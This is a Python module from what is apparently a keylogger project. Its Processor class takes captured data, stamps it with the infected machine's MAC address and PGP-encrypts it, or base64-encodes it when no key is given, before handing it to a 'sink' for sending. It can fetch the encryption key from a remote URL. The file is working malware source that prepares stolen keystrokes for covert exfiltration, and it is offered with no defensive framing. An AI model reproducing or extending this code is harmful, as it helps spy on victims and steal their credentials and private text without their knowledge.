import base64
from typing import List
from pgpy import PGPKey, PGPMessage
import requests
from keylogger.data_wrapper import DataWrapper
from getmac import get_mac_address


class Processor:
    """
    Processor is a class that processes the data before sending it to the sink.

    it encrypts the data using the provided PGP key,
    and fallback to base64 encoding if the key is not provided.
    """

    def __init__(self, key: str):
        self.mac = get_mac_address()
        if key:
            self.key = PGPKey.from_blob(key)
        else:
            self.key = None

    def process_data(self, data: DataWrapper) -> DataWrapper:
        data.encrypted = self._encrypt(data.data)
        data.machine_id = self.mac
        return data

    def _encrypt(self, data: List) -> str:
        """
        Encrypt the data using the PGP key.

        fallback to base64 encoding if the key is not provided.
        """
        if not self.key:
            return base64.b64encode("".join(data).encode()).decode()

        try:
            message = PGPMessage.new(data)
            return self.key.encrypt(message)
        except Exception:
            return ""

    @classmethod
    def key_from_url(cls, url: str):
        resp = requests.get(url)
        if resp.status_code != 200:
            raise Exception("Failed to get the key from the URL")

        return cls(resp.text)
